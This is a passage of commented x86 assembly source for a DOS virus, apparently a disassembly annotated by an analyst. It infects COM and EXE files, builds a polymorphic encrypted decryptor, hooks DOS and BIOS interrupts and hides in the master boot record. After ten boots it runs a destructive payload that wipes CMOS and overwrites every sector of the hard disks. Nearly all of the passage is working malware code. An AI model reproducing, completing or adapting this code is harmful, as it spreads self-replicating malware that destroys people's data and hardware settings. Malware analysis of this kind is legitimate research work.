           mov     bp,3            ; It's EXE
           ret

   cmp_fname:
           mov     si,dx
           call    end_fname
           dec     si              ; SI points to end fname
           mov     bp,si
           push    cs
           pop     es
           mov     di,offset(end_command)
           mov     cx,end_command-st_command
           call    cmp_strings     ; COMMAND.COM?
           jc      invalid_fname   ; Yes? then jmp
           mov     si,bp
           mov     di,offset(end_gdi)
           mov     cx,end_gdi-end_command
           call    cmp_strings     ; GDI.EXE?
           jc      invalid_fname   ; Yes? then jmp
           mov     si,bp
           mov     di,offset(end_dosx)
           mov     cx,end_dosx-end_gdi
           call    cmp_strings     ; DOSX.EXE?
           jc      invalid_fname   ; Yes? then jmp
           mov     si,bp
           mov     di,offset(end_win386)
           mov     cx,end_win386-end_dosx
           call    cmp_strings     ; WIN386.EXE?
           jc      invalid_fname   ; Yes? then jmp
           mov     si,bp
           mov     di,offset(end_krnl286)
           mov     cx,end_krnl286-end_win386
           call    cmp_strings     ; KRNL286.EXE?
           jc      invalid_fname   ; Yes? then jmp
           mov     si,bp
           mov     di,offset(end_krnl386)
           mov     cx,end_krnl386-end_krnl286
           call    cmp_strings     ; KRNL386.EXE?
           jc      invalid_fname   ; Yes? then jmp
           mov     si,bp
           mov     di,offset(bad_end_user) ; BUG!!!! offset(end_user)
           mov     cx,end_user-end_krnl386
           call    cmp_strings     ; USER.EXE? (BUG)
           jc      invalid_fname   ; Yes? then jmp
           mov     si,bp
           mov     di,offset(end_wswap)
           mov     cx,end_wswap-end_user
           call    cmp_strings     ; WSWAP.EXE?
           jc      invalid_fname   ; Yes? then jmp
           clc                     ; Valid filename
   invalid_fname:
           ret

   get_file_encryption:
           push    cs
           pop     ds
           mov     ofs_virus,offset(length_virus)-offset(l_mask)
           call    lseek
           mov     ah,3Fh
           mov     dx,offset(code_mask)
           mov     cx,1
           call    int21h          ; Read 1 byte (encryption mask)
           push    cs
           pop     ds
           mov     ofs_virus,offset(length_virus)-(offset(prefix_op)+1)
           call    lseek
           mov     ah,3Fh
           mov     dx,offset(ofs_virus)
           mov     cx,1
           call    int21h          ; Read 1 byte
           cmp     byte ptr ofs_virus,0F6h ; Not encryption?
           je      m_not                   ; Yes? then jmp
           cmp     byte ptr ofs_virus,80h  ; Xor encryption?
           je      m_xor                   ; Yes? then jmp
           cmp     byte ptr ofs_virus,0D0h ; Ror encryption?
           je      m_ror                   ; Yes? then jmp
           cmp     byte ptr ofs_virus,0FEh ; Dec encryption?
           je      m_dec                   ; Yes? then jmp
   m_not:
           mov     crypt_method,1
           ret
   m_xor:
           mov     crypt_method,0
           ret
   m_ror:
           mov     crypt_method,2
           ret
   m_dec:
           mov     crypt_method,3
           ret

   check_if_infected:
           push    cs
           pop     ds
           call    get_file_encryption
           mov     ofs_virus,offset(length_virus)-offset(gdi_exe)
           call    lseek
           mov     ah,3Fh
           mov     dx,offset(ofs_virus)
           mov     cx,2
           call    int21h          ; Read 2 bytes
           mov     si,offset(ofs_virus)
           call    decrypt_bytes
           mov     cx,word ptr gdi_exe
           cmp     cx,ofs_virus    ; Infected file?
           ret

   get_n_di:                               ; Get SI in [0, DI, DI*2]
           call    get_random
           mov     cl,0Eh
           shr     ax,cl           ; AX in [0..3]
           mov     si,di
           mul     si
           mov     si,ax
           sub     si,di
           jns     not_neg
           neg     si
   not_neg:
           ret

   get_1byte_inst:
           call    get_random
           mov     cl,0Eh
           shr     ax,cl           ; AX in [0..3]
           mov     si,ax
           mov     al,byte ptr [si+one_byte_inst]
           ret

   mbr_code:
           cli
           xor     ax,ax
           mov     ss,ax
           mov     sp,7C00h
           push    cs
           pop     ds
           mov     cx,end_mbr_code-mbr_code
           mov     bx,7C00h+(st_mbr_enc-mbr_code)
   tmbr_code:
           push    cx
   decrypt_mbr:
           xor     byte ptr [bx],0         ; xor byte ptr [bx],mask_mbr
   mask_mbr        equ     byte ptr $-1
           inc     bx
           loop    decrypt_mbr
   st_mbr_enc:
           mov     ax,910h
           mov     es,ax   ; ES:=0910h
           mov     ah,8
           mov     dl,80h
           int     13h     ; Get current drive parameters
           inc     ch      ; Inc max. cylinder
           sub     cl,2    ; Dec*2 max. sector
           mov     dl,80h
           mov     ax,201h
           mov     bx,sp
           int     13h                     ; Read 1 sector
           inc     word ptr es:[bx]        ; Inc boots counter
           mov     ax,301h
           int     13h                     ; Write sector
           cmp     word ptr es:[bx],10     ; <10 boots?
           jb      no_activate             ; Yes? then jmp
           mov     word ptr es:[bx],0      ; Reset boots counter
           mov     ax,301h
           int     13h             ; Write 1 sector
   kill_cmos_hd:
           mov     bp,7C00h
           in      al,21h          ; Interrupt controller, 8259A.
           or      al,2            ; Disable keyboard IRQ
           out     21h,al          ; Interrupt controller, 8259A.
           mov     cx,40h
   kill_cmos:
           mov     al,cl
           out     70h,al          ; CMOS Memory
           xor     al,al
           out     71h,al          ; Fill CMOS with zeros
           loop    kill_cmos
           mov     dl,80h          ; 1st HD
   kill_hd:
           mov     bh,dl
           mov     ah,8
           int     13h     ; Get current drive parameters
           mov     dl,bh   ; DL:=80h
           mov     al,cl
           mov     cx,101h ; Start in cylinder 1, sector 1
   other_cylinder:
           push    dx
   other_head:
           push    ax
           mov     ah,3
           int     13h     ; Write sector
           pop     ax
           dec     dh      ; dec head
           jnz     other_head
           pop     dx
           cmp     ch,0FFh         ; Cylinder=255?
           pushf
           inc     ch              ; Inc cylinder
           popf
           jne     other_cylinder  ; No? then jmp
           xor     ax,ax
           mov     ds,ax                   ; ds:=0
           cmp     byte ptr ds:[475h],1    ; <=1 HD present?
           jbe     continue_killing        ; Yes? then jmp
           inc     dl                      ; Next HD
           jmp     kill_hd                 ; Kill it
   continue_killing:
           test    cl,80h          ; More cylinders?
           jnz     c_768           ; Yes? then jmp
           test    cl,40h          ; More cylinders?
           jnz     c_256           ; Yes? then jmp
           mov     cl,41h          ; Cylinder 256->512
   jmp_other_cylinder:
           xor     ch,ch
           jmp     other_cylinder
   c_256:
           mov     cl,81h          ; Cylinder 512->768
           jmp     jmp_other_cylinder
   c_768:
           mov     cl,0C1h         ; Cylinder 768->1024
           jmp     jmp_other_cylinder

   no_activate:
           mov     ax,ds:[413h]    ; Number of KBs
           sub     ax,8            ; Get 8 KB
           mov     cl,6
           shl     ax,cl           ; Calculate base segment
           mov     es,ax
           xor     di,di
           pop     cx
           mov     si,sp
           cld
           rep     movsb           ; Move code
           mov     ax,(read_code_from_disk-mbr_code)
           push    es
           push    ax
           retf            ; jmp read_code_from_disk

   read_code_from_disk:
           mov     ax,end_mbr_code-mbr_code
           mov     cl,4
           shr     ax,cl   ; Calculate relative segment
           inc     ax      ; Next segment
           mov     bx,cs
           add     ax,bx   ; Calculate absolute segment
           mov     es,ax   ; Base segment for code
           mov     ah,8
           mov     dl,80h
           int     13h     ; Get current drive parameters
           inc     ch
           mov     dl,80h
           sub     cl,0Eh
           mov     ax,20Ch
           xor     bx,bx
           int     13h     ; Read 12 sectors (code)
           mov     al,cs:[mask_orig_mbr-mbr_code]
           mov     es:mask_orig_mbr,al
           mov     es:changes_i21,0
           mov     es:loading_dos,0
           mov     ah,cs:[floppy_types-mbr_code]
           mov     es:floppy_types,ah
           mov     dx,0Ah
           mov     al,10h
           out     70h,al          ; CMOS Memory: diskette drive type
           in      al,71h          ; CMOS Memory: read byte
           or      al,al           ; Zero? No floppy?
           jnz     already_enabled ; Yes? then jmp
           mov     dx,6
           mov     al,10h
           call    write_cmos      ; Enable floppy
   already_enabled:
           xor     ax,ax
           mov     ds,ax           ; ds:=0
           mov     byte ptr ds:[700h],16h  ; Mark in DOS segment
           mov     bp,cs:[inst_hard-mbr_code]
           mov     ds:[410h],bp
           lds     si,ds:[21h*4]   ; Get int 21h
           cli
           mov     es:[boot_i21],ds
           sti
           mov     ds,ax
           lds     si,ds:[1Ch*4]   ; Get int 1Ch
           mov     es:[ofs_1c],si  ; Store it
           mov     es:[seg_1c],ds
           mov     ds,ax
           cli
           mov     ds:[1Ch*4],offset(int1Ch)       ; Set new int 1Ch
           mov     ds:[1Ch*4+2],es
           sti
           mov     es,ax
           mov     bx,7C00h
           cmp     dx,0Ah          ; Was the floppy enabled?
           jz      no_read_boot    ; Yes? then jmp
           xor     dx,dx
           int     13h             ; Reset drive A:
           mov     si,2
   try_read_again:
           mov     ax,201h
           mov     cx,1
           int     13h             ; Read sector (boot)
           jnc     exec_boot_mbr
           dec     si
           jnz     try_read_again
   no_read_boot:
           mov     ah,8
           mov     dl,80h
           int     13h             ; Get current drive parameters
           inc     ch
           dec     cl
           mov     dl,80h
           mov     ax,201h
           int     13h             ; Read 1 sector (original MBR)
           mov     al,cs:[mask_orig_mbr-mbr_code]
           mov     si,bx
           mov     cx,512
   dec_orig_mbr:
           xor     es:[si],al      ; Decrypt original MBR
           inc     si
           loop    dec_orig_mbr
   exec_boot_mbr:
           db      0EAh
           dw      7C00h,0         ; jmp far ptr 0:7C00h
                       ; Exec original MBR/boot A:

   write_cmos:     ; Input:        AL = CMOS address
           ;               AH = byte to write
           cli
           or      al,80h          ; Disable NMI
           out     70h,al          ; CMOS Memory: Select address
           mov     al,ah
           jmp     $+2
           jmp     $+2
           out     71h,al          ; CMOS Memory: Write byte
           mov     al,0
           jmp     $+2
           jmp     $+2
           out     70h,al          ; CMOS Memory: Select address
           sti
           ret

   mask_orig_mbr   db      60h
   ;_b2c
   floppy_types    db      24h
   ;_b2d
   inst_hard       dw      4461h
   chksum_method   db      0
   changes_i21     db      2

   end_mbr_code:

   int1Ch:
           call    push_registers
           cmp     cs:loading_dos,1        ; Loading DOS?
           je      dos_present             ; Yes? then jmp
           xor     ax,ax
           mov     ds,ax                   ; DS:=0
           cmp     byte ptr ds:[700h],16h  ; Mark present?
           je      no_dos_loaded           ; Yes? then jmp
           mov     cs:loading_dos,1        ; No? then loading DOS
           sub     word ptr ds:[413h],8    ; Get 8 KB
           call    disable_FD
   dos_present:
           xor     ax,ax
           mov     es,ax                   ; ES:=0
           mov     ax,cs:boot_i21
           cmp     es:[21h*4+2],ax         ; Int 21h changed?
           je      no_dos_loaded           ; No? then jmp
           mov     ds,es:[21h*4+2]
           mov     cs:boot_i21,ds          ; Save segment of new i21h
           inc     cs:changes_i21
           cmp     cs:changes_i21,2        ; Two changes?
                           ; (DOS changes i21h 2 times)
           jne     no_dos_loaded           ; No? then jmp
           push    cs
           pop     es
           mov     di,offset(_header)
           xor     al,al
           mov     cx,115h
           cld
           rep stosb               ; Clear data area
           push    cs
           pop     ds
           mov     al,13h
           call    get_int_vector          ; Get int 13h
           mov     ofs_i13,bx              ; Store it
           mov     seg_i13,es
           call    set_ints                ; Initialize ints
           push    cs
           pop     ds
           xor     ax,ax
           mov     es,ax                   ; ES:=0
           lds     di,dword ptr ofs_1c
           cli
           mov     es:[1Ch*4],di           ; Restore int 1Ch
           mov     es:[1Ch*4+2],ds
           add     word ptr es:[413h],8    ; Return the 8 KB to the
                           ;  system (the DOS is loaded
                           ;  and will not use them)
           sti
   no_dos_loaded:
           call    pop_registers
           iret

   read_cmos:                              ; Input:        AL = address to read
                       ; Output:       AH = byte from CMOS
           or      al,80h          ; Disables NMI
           cli
           out     70h,al          ; CMOS Memory: Select address
           call    waste_time
           in      al,71h          ; CMOS Memory: Read byte
           mov     ah,al
           mov     al,0
           call    waste_time
           out     70h,al          ; CMOS Memory: Select address 0
           sti
           ret

   set_ints:
           push    cs
           pop     ds
           mov     flags,80h
           mov     point,'.'
           mov     jmp_virus,0E9h  ; jmp opcode
           mov     al,21h
           call    get_int_vector  ; Get int 21h
           mov     ofs_i21,bx      ; Store it
           mov     seg_i21,es
           mov     al,13h
           call    get_int_vector  ; Get int 13h
           mov     ofs_i13_2,bx    ; Store it
           mov     seg_i13_2,es
           xor     ax,ax
           mov     ds,ax           ; DS:=0
           cli
           mov     word ptr ds:[21h*4],offset(int_21)      ; Set new i21
           mov     ds:[21h*4+2],cs
           mov     word ptr ds:[20h*4],offset(int_20)      ; Set new i20
           mov     ds:[20h*4+2],cs
           mov     word ptr ds:[27h*4],offset(int_27)      ; Set new i27
           mov     ds:[27h*4+2],cs
           sti
           call    patch_i13
           ret

   disable_FD:
           test    cs:flags,2      ; Permission to disable floppy?
           jnz     no_disable_fd   ; No? then jmp
           cmp     cs:chksum_method,2      ; Known checksum method?
           je      no_disable_fd           ; No? then jmp
           push    ax
           mov     ax,10h
           call    write_cmos              ; Disable FD from CMOS
           call    write_CMOS_chksum       ; Calculate new checksum
           pop     ax
   no_disable_fd:
           ret

   enable_FD:
           cmp     cs:chksum_method,2      ; Known checksum CMOS method?
           je      no_change_cmos          ; No? then jmp
           push    ax
           mov     ah,cs:floppy_types
           mov     al,10h
           call    write_cmos              ; Enable FD drives
           call    write_CMOS_chksum       ; Restore cmos checksum
           pop     ax
   no_change_cmos:
           ret

   write_CMOS_chksum:
           call    push_registers
           cmp     cs:chksum_method,1      ; Method 2?
           je      write_CMOS_chksum2      ; Yes? then jmp
           call    calculate_CMOS_checksum_1
           mov     al,2Eh
           mov     ah,dh
           call    write_cmos      ; Store new checksum in CMOS
           mov     al,2Fh
           mov     ah,dl
           call    write_cmos
           jmp     _pops
   write_CMOS_chksum2:
           call    calculate_CMOS_checksum_2
           mov     al,32h
           mov     ah,dh
           call    write_cmos      ; Store new checksum in CMOS
           mov     al,33h
           mov     ah,dl
           call    write_cmos
   _pops:
           call    pop_registers
           ret

   calculate_CMOS_checksum_1:
           mov     cx,1Eh
           xor     dx,dx
           mov     al,10h
   next_cmos_byte:
           mov     bl,al
           call    read_cmos
           mov     al,bl
           inc     al
           push    ax
           xchg    ah,al
           xor     ah,ah
           add     dx,ax           ; Make checksum
           pop     ax
           loop    next_cmos_byte
           ret

   calculate_CMOS_checksum_2:
           mov     cx,22h
           xor     dx,dx
           mov     al,10h
   next_byte_CMOS:
           mov     bl,al
           call    read_cmos
           mov     al,bl
           inc     al
           push    ax
           xchg    ah,al
           xor     ah,ah
           xor     dx,ax           ; Make checksum
           pop     ax
           loop    next_byte_CMOS
           ret

   write_virus:
           push    cs
           pop     ds
           push    cs
           pop     es
           mov     di,offset(num_bytes)
           mov     [di],offset(length_virus)       ; Bytes to decrypt
           call    get_random
           mov     cl,0Bh
           shr     ax,cl           ; AX in [0..1Fh]
           add     [di],ax         ; Variable number of bytes to decrypt
           cmp     bp,1            ; COM file?
           jne     write_start_exe ; No? then jmp
           mov     ax,4202h
           xor     cx,cx
           xor     dx,dx
           call    int21h          ; Lseek end
           cmp     ax,1Ch          ; size > 1Ch bytes?
           ja      check_if_big    ; Yes? then jmp
           jmp     _ret_2          ; Stupid jmp!!

   check_if_big:
           mov     di,ax
           push    ax
           clc
           add     ax,offset(vir_end)+495          ; !?
           pop     ax
           jnc     write_start_com ; Too big? No, then jmp
           jmp     _ret_2          ; Stupid jmp!!

   write_start_com:
           call    write_jmptovir
           jnb     make_decryptor
           jmp     _ret_2          ; Stupid jmp!!

   write_start_exe:
           call    write_header_exe
           jnc     make_decryptor
           jmp     _ret_2          ; Stupid jmp!!

   make_decryptor:
           call    get_1byte_inst
           mov     _1cx,al
           mov     di,3
           call    get_n_di        ; Get 0 or 3 or 6 in SI
           add     si,offset(table_reg_source)     ; Source register
           mov     di,offset(r_source)
           cld
           movsb           ; the mov
           mov     di,offset(r_op)
           movsb           ; the source register
           mov     di,offset(i_inc)
           movsb           ; the inc
           mov     di,4
           call    get_n_di        ; Get 0 or 4 or 8 in SI
           add     si,offset(table_reg_index)      ; Index register
           mov     di,offset(r_index)
           movsb           ; the mov
           mov     di,offset(d_loop)
           movsb           ; Store dec+jne or loop+garbage
           movsw
           call    get_random
           mov     cl,0Eh
           shr     ax,cl           ; AX in [0..3]: get encrytion method
           mov     crypt_method,al
           call    get_random
           mov     cl,0Fh
           shr     ax,cl           ; AX in [0..1]
           jnz     no_xchg_inst
           mov     di,offset(xchg1)        ; xchg 2 instructions
           mov     si,offset(r_index)
           push    di
           push    si
           movsw
           movsw
           movsw
           pop     di              ; DI:=offset(xchg1)
           mov     si,offset(xchg2)
           movsw
           movsb
           pop     si
           movsw
           movsb
   no_xchg_inst:
           cmp     crypt_method,0          ; Xor?
           jz      enc_met_xor             ; Yes? then jmp
           cmp     crypt_method,1          ; Not?
           jz      enc_met_not             ; Yes? then jmp
           cmp     crypt_method,2          ; Rol?
           jz      enc_met_rol             ; Yes? then jmp
           cmp     crypt_method,3          ; Dec?
           jz      enc_met_inc             ; Yes? then jmp
   enc_met_xor:
           mov     prefix_op,802Eh         ; xor cs:
           jmp     decryptor_done
   enc_met_not:
           mov     prefix_op,0F62Eh        ; not cs:
           call    get_1byte_inst
           mov     l_mask,al               ; Don't need a mask
           sub     r_op,20h
           jmp     decryptor_done
   enc_met_inc:
           mov     prefix_op,0FE2Eh        ; inc cs:
           call    get_1byte_inst
           mov     l_mask,al               ; Don't need a mask
           sub     r_op,30h
           jmp     decryptor_done

   enc_met_rol:
           mov     prefix_op,0D02Eh        ; rol cs:
           call    get_1byte_inst
           mov     l_mask,al               ; Don't need a mask
           sub     r_op,30h
   decryptor_done:
           cmp     bp,1                    ; COM file?
           jne     encrypt_code_and_write  ; No? then jmp
                           ;  In EXE we need SEG CS:
           mov     ax,offset(encrypt_code_and_write)
           push    ax
           call    get_random
           mov     cl,0Eh
           shr     ax,cl           ; AX in [0..3]: Get segment prefix
           cmp     al,1            ; Seg SS?
           je      seg_ss          ; Yes? then jmp
           cmp     al,2            ; Seg ES?
           je      seg_es          ; Yes? then jmp
           cmp     al,3            ; Seg CS?
           je      seg_cs          ; Yes? then jmp
           call    get_1byte_inst  ; if al=0
           mov     byte ptr prefix_op,al   ; Subst CS: by one byte inst.
           ret                             ; jmp encrypt_code_and_write
   seg_es:
           mov     byte ptr prefix_op,26h  ; SEG ES:
           ret                             ; jmp encrypt_code_and_write
   seg_cs:
           mov     byte ptr prefix_op,2Eh  ; SEG CS:
                           ; BUG!!!! Already CS:
                           ; It would be DS: (3Eh)
           ret                             ; jmp encrypt_code_and_write
   seg_ss:
           mov     byte ptr prefix_op,36h  ; SEG SS:
           ret                             ; jmp encrypt_code_and_write

   encrypt_code_and_write:
           mov     dx,offset(buffer_enc)
           mov     cl,4
           shr     dx,cl           ; Calculate base address
           inc     dx
           push    cs
           pop     ax
           add     ax,dx
           mov     es,ax
   get_no_zero:
           call    get_random
           or      al,al           ; Zero?
           jz      get_no_zero     ; Yes? then jmp
           cmp     crypt_method,0  ; XOR? Need a mask
           jnz     not_mask        ; No? then jmp
           mov     cs:l_mask,al    ; Store mask
           mov     dl,al
   not_mask:
           push    dx
           mov     ax,4202h
           xor     cx,cx
           xor     dx,dx
           call    int21h          ; Lseek end
           mov     ah,40h
           xor     dx,dx
           mov     cx,offset(code_enc)
           mov     si,cx
           call    int21h          ; Write decryptor to file
           pop     dx
           xor     di,di
   enc_next_byte:
           lodsb
           cmp     crypt_method,1  ; Not?
           jz      _not            ; Yes? then jmp
           cmp     crypt_method,0  ; Xor?
           jz      _xor            ; Yes? then jmp
           cmp     crypt_method,2  ; Rol?
           jz      _rol            ; Yes? then jmp
           cmp     crypt_method,3  ; Inc?
           jz      _inc            ; Yes? then jmp
   _xor:
           xor     al,dl
           jmp     enc_byte
   _not:
           not     al
           jmp     enc_byte
   _inc:
           dec     al
           jmp     enc_byte
   _rol:
           ror     al,1
   enc_byte:
           stosb                   ; Store encrypted byte
           cmp     si,offset(length_virus) ; All encrypted?
           ja      all_encrypted           ; Yes? then jmp
           cmp     di,512          ; Write in blocks of 512 bytes
                       ; End of a block?
           je      write_512       ; Yes? then jmp
   jmp_enc_next:
           jmp     enc_next_byte

   write_512:
           push    ds
           push    es
           push    dx
           mov     ah,40h
           push    es
           pop     ds
           mov     cx,di
           xor     dx,dx
           call    int21h          ; Write an encrypted 512-block
           jc      _ret_2
           pop     dx
           pop     es
           pop     ds
           xor     di,di
           jmp     jmp_enc_next

   all_encrypted:
           mov     ah,40h
           mov     cx,di
           dec     cx
           xor     dx,dx
           push    es
           pop     ds
           call    int21h          ; Write last block
           mov     ax,cs:f_date
           rcr     ah,1
           pushf
           add     ah,100          ; Mark infected (add 100 years)
           popf
           rcl     ah,1
           mov     cs:f_date,ax
           clc
   _ret_2:
           ret

   cmp_3bytes:
           mov     cx,3
           cld
           rep     cmpsb
           ret

   exe_or_com?:
           push    cs
           pop     es
           mov     si,dx
           call    end_fname       ; filename.ext
                       ;             ^ SI
           sub     si,3            ; filename.ext
                       ;          ^SI
           mov     di,offset(ext_com)
           push    si
           call    cmp_3bytes      ; COM?
           pop     si
           jne     cmp_exe         ; No? then jmp
           mov     bp,1
           ret

   cmp_exe:
           mov     di,offset(ext_exe)
           push    si
           call    cmp_3bytes      ; EXE?
           pop     si
           jne     not_execom      ; No? then jmp
           mov     bp,3
           ret
   not_execom:
           xor     bp,bp
           ret

   get_random:                             ; Get random number in AX
           xor     al,al
           out     43h,al          ; Timer 8253-5 (AT: 8254.2).
           in      al,40h          ; Timer 8253-5 (AT: 8254.2).
           mov     ah,al
           in      al,40h          ; Timer 8253-5 (AT: 8254.2).
           ret

   make_fname:
           push    si
           push    di
           push    es
           push    cx
           push    ax
           mov     si,dx
           inc     si
           mov     cx,8
           mov     di,offset(filename)
           push    cs
           pop     es
           rep     movsb           ; Store name
           mov     si,dx
           add     si,9
           mov     cx,3
           mov     di,offset(filename_ext)
           rep     movsb           ; Store extension
           push    cs
           pop     ds
           mov     dx,offset(filename)
           call    normalize_fname
           pop     ax
           pop     cx
           pop     es
           pop     di
           pop     si
           ret

   host_type       db      1       ; 1 = COM
                   ; 3 = EXE

   table_reg_source:
           db      0BBh    ; mov bx,????
           db      37h     ; reg BX
           inc     bx

           db      0BEh    ; mov si,????
           db      34h     ; reg SI
           inc     si

           db      0BFh    ; mov di,????
           db      35h     ; reg DI
           inc     di
   ;100C
   table_reg_index:
   ; Using AX
           db      0B8h    ; mov ax,????
           dec     ax
           jne     $-6
   ; Using CX
           db      0B9h    ; mov cx,????
           loop    $-5
   _1cx            equ     byte ptr $      ; 1 byte instruction
           clc
   ; Using DX
           db      0BAh    ; mov dx,????
           dec     dx
           jne     $-6

   one_byte_inst:
           nop
           std
           cld
           clc

   read_header:
           mov     ah,3Fh
           mov     cx,1Ch
           push    cs
           pop     ds
           mov     dx,offset(_header)
           call    int21h          ; Read file header
           ret

   get_ofs_fname:
           push    cs
           pop     ds
           mov     ah,30h
           call    int21h          ; Get DOS version
           mov     ofs_sft,20h
           xchg    ah,al
           cmp     ax,300h         ; DOS 3.0?
           jne     not_inc_offset  ; No? then jmp
           inc     ofs_sft         ; ofs_sft:=21h
   not_inc_offset:
           ret

   end_fname:              ; Output:       SI points to end of filename

           mov     cx,43h
   search_end_fname:                       ; Search end of filename (0)
           mov     al,[si]
           or      al,al           ; Zero?
           jz      end_asciiz      ; Yes? then jmp
           inc     si
           loop    search_end_fname
   end_asciiz:
           ret

   int21h:
           pushf
           call    dword ptr cs:ofs_i21
           ret

   int13h:
           pushf
           call    dword ptr cs:ofs_i13
           ret

   int13hbp:
           pushf
           call    dword ptr cs:[bp+ofs_i13]
           ret

   int24h:
           mov     al,3
   _iret:
           iret

   set_i24_i1B_i23:
           push    ds
           push    cs
           pop     ds
           push    bx
           mov     ax,3524h
           call    int21h          ; Get int 24h
           mov     [ofs_i24],bx    ; Save it
           mov     [seg_i24],es
           mov     al,1Bh
           call    int21h          ; Get int 1Bh
           mov     [ofs_i1b],bx    ; Save it
           mov     [seg_i1b],es
           mov     al,23h
           call    int21h          ; Get int 23h
           mov     [ofs_i23],bx    ; Save it
           mov     [seg_i23],es
           pop     bx
           push    ax
           push    dx
           mov     ax,2524h
           mov     dx,offset(int24h)
           call    int21h          ; Set new int 24h
           mov     al,1Bh
           mov     dx,offset(_iret)
           call    int21h          ; Set new int 1Bh (iret)
           mov     al,23h
           mov     dx,offset(_iret)
           call    int21h          ; Set new int 23h (iret)
           pop     dx
           pop     ax
           pop     ds
           ret


   restore_i24_i1b_i23:
           mov     ax,2524h
           lds     dx,dword ptr cs:ofs_i24
           call    int21h          ; Restore int 24h
           mov     al,1Bh
           lds     dx,dword ptr cs:ofs_i1b
           call    int21h          ; Restore int 1Bh
           mov     al,23h
           lds     dx,dword ptr cs:ofs_i23
           call    int21h          ; Restore int 23h
           ret

   write_jmptovir:
           push    cs
           pop     ds
           push    cs
           pop     es
           push    di
           mov     si,offset(_header)
           mov     di,offset(header)
           cld
           movsw           ; Save original bytes (3)
           movsb
           pop     di
           mov     ax,4200h
           xor     cx,cx
           xor     dx,dx
           call    int21h          ; Lseek start
           mov     ofs_virus,di
           push    di
           sub     ofs_virus,3
           mov     ah,40h
           mov     cx,3
           mov     dx,offset(jmp_virus)
           call    int21h          ; Write jmp
           mov     host_type,1     ; COM file
           pop     di
           add     di,100h         ; Calculate delta offset
           mov     delta,di
           add     di,offset(code_enc)     ; Where encrypted code starts
           mov     st_code_enc,di
           clc
           ret

   write_header_exe:
           push    cs
           pop     ds
           push    cs
           pop     es
           mov     si,offset(_header)
           push    si
           mov     di,offset(header)
           mov     cx,1Ch
           cld
           rep     movsb           ; Store header
           pop     si
           mov     ax,[si+(_pagecnt-_header)]
           mov     dx,512
           dec     ax
           mul     dx              ; (pagecnt-1)*512
           mov     length_hi,dx
           mov     dx,[si+(_partpag-_header)]
           clc
           add     ax,dx           ; File size:=(pagecnt-1)*512+partpag
           adc     length_hi,0
           mov     length_lo,ax
           xor     cx,cx
           mov     dx,cx
           mov     ax,4202h
           call    int21h          ; Lseek end (get real length)
           sub     ax,length_lo
           sbb     dx,length_hi    ; File has internal overlays?
           jz      no_overlays     ; No? then jmp
           jmp     stc_ret
   no_overlays:
           push    bx
           mov     ax,4202h
           xor     cx,cx
           mov     dx,cx
           call    int21h          ; Lseek end
           push    ax              ; Save length
           push    dx
           mov     ax,[si+(_hdrsize-_header)]
           mov     cl,4
           shl     ax,cl           ; mul 16 = size of header
           xchg    ax,bx
           pop     dx              ; Get length
           pop     ax
           push    ax
           push    dx
           sub     ax,bx           ; Sub size of header
           sbb     dx,0
           mov     cx,10h
           div     cx              ; Calculate initial paragraph
           mov     [si+(_exeip-_header)],dx
           mov     [si+(_relocs-_header)],ax
           pop     dx
           pop     ax
           add     ax,offset(length_virus) ; New file length
           adc     dx,0
           mov     cl,9
           push    ax
           shr     ax,cl           ; div 512
           ror     dx,cl
           stc
           adc     dx,ax
           pop     ax
           and     ah,1
           mov     [si+(_pagecnt-_header)],dx
           mov     [si+(_partpag-_header)],ax
           pop     bx
           clc
           add     word ptr [si+(_minmem-_header)],39h  ; why 39h?????
                   ; (offset(vir_end)-length_virus+15)/16 (?)
           jnc     nosub_minmem
           sub     word ptr [si+(_minmem-_header)],39h
   nosub_minmem:
           clc
           add     word ptr [si+(_maxmem-_header)],39h
           jnc     nosub_maxmem
           sub     word ptr [si+(_maxmem-_header)],39h
   nosub_maxmem:
           mov     cl,4
           mov     ax,offset(end_virdata)
           shr     ax,cl           ; div 16
           mov     dx,[si+(_relocs-_header)]
           add     ax,dx           ; Segment of stack
           mov     [si+(_reloss-_header)],ax
           mov     word ptr [si+(_relosp-_header)],vstack-end_virdata
           xor     cx,cx
           mov     dx,cx
           mov     ax,4200h
           call    int21h          ; Lseek start
           mov     dx,si
           mov     ah,40h
           mov     cx,1Ch
           call    int21h          ; Write header
           mov     dx,[si+(_exeip-_header)]
           mov     delta,dx                ; Delta offset
           add     dx,offset(code_enc)     ; Where encrypted code starts
           mov     st_code_enc,dx
           mov     host_type,3     ; EXE file
           clc
           ret

   stc_ret:
           stc
           ret

   disinfect_file:
           call    push_registers
           pushf
           call    normalize_fname
           call    set_i24_i1B_i23
           mov     cs:seg_fname,ds
           mov     cs:ofs_fname,dx
           call    get_reset_attr
           jc      r_ints
           call    exe_or_com?
           or      bp,bp           ; Exe or Com?
           jz      r_ints          ; No? then jmp
           mov     ax,3D02h
           call    int21h          ; Open I/O
           jc      r_ints
           mov     bx,ax           ; bx:=handle
           call    read_header
           call    check_if_exe
           call    get_ftime
           call    check_if_infected       ; Infected?
           jnz     close_file              ; Yes? then jmp
           call    get_file_encryption
           cmp     bp,1                    ; COM file?
           jne     jmp_disinfect_exe       ; No? then jmp
           call    disinfect_com
           jmp     quit_inf_mark

   jmp_disinfect_exe:
           call    disinfect_exe
   quit_inf_mark:
           mov     ax,cs:f_date
           rcr     ah,1
           pushf
           sub     ah,100          ; Quit mark
           popf
           rcl     ah,1
           mov     cs:f_date,ax
   close_file:
           call    restore_ftime
           mov     ah,3Eh
           call    int21h          ; Close file
           mov     ds,cs:seg_fname
           mov     dx,cs:ofs_fname
           call    restore_attr
   r_ints:
           call    restore_i24_i1b_i23
           popf
           call    pop_registers
           ret

   lseek:
           mov     ax,4202h
           xor     cx,cx
           xor     dx,dx
           call    int21h          ; Lseek end
           mov     cx,dx
           mov     dx,ax
           sub     dx,cs:ofs_virus
           mov     ax,4200h
           call    int21h          ; Lseek to length(file)-ofs_virus
           ret

   truncate_file:
           mov     cs:ofs_virus,offset(length_virus)
           call    lseek           ; Lseek to start of viral code
           mov     ah,40h
           xor     cx,cx
           call    int21h          ; Truncate file (original size)
           ret

   disinfect_com:
           mov     cs:ofs_virus,1Ch
           call    lseek           ; Lseek to length(file)-1Ch
           mov     ah,3Fh
           mov     cx,3
           push    cs
           pop     ds
           mov     dx,offset(_3bytes)
           push    dx
           call    int21h          ; Read original 3 bytes
           mov     ax,4200h
           xor     cx,cx
           xor     dx,dx
           call    int21h          ; Lseek start
           mov     al,code_mask
           pop     si
           push    si
           mov     cx,3
           push    cx
           call    decrypt_bytes   ; Decrypt original 3 bytes
           pop     cx
           pop     dx
           mov     ah,40h
           call    int21h          ; Restore host
           call    truncate_file   ; Truncate to original size
           ret

